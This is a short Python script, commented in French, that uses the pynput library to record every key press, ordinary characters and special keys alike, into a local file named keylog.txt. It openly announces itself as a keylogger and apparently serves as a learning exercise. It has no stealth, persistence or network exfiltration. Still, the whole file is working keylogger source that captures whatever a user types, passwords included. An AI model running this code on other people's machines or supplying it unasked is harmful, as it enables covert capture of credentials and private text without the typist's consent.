
from pynput import keyboard 
from pynput.keyboard import Key, Listener
import time

def on_press(key):
    try:
        # Pour les touches normales (caractères)
        with open("keylog.txt", "a", encoding="utf-8") as f:
            if hasattr(key, 'char'):
                f.write(f"{key.char}\n")
            else:
                # Pour les touches spéciales
                f.write(f"Touche spéciale: {key}\n")
            f.flush()  # Force l'écriture immédiate
    except Exception as e:
        print(f"Erreur: {e}")

print("Keylogger démarré. Appuyez sur des touches...")
# Démarre l'écouteur
with Listener(on_press=on_press) as listener:
    #hnaya faut savoir que le "with" gère automatiquement le démarrage et l'arrêt
    #donc pas la peine de start le listener explicitement
    listener.join()  # Garde le script en cours d'exécution